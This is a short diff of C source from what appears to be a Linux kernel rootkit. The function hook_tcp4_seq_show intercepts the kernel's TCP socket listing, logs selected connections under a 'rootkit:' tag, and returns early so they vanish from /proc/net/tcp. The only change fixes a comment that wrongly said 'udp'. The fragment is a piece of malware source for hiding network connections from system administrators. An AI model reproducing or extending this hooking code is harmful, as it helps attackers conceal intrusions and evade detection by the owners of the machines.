@@ -55,7 +55,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
             printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
                    ntohs(is->inet_sport), ntohs(is->inet_dport));
 
-            // drop from /proc/net/udp
+            // drop from /proc/net/tcp
             return 0;
         }
     }
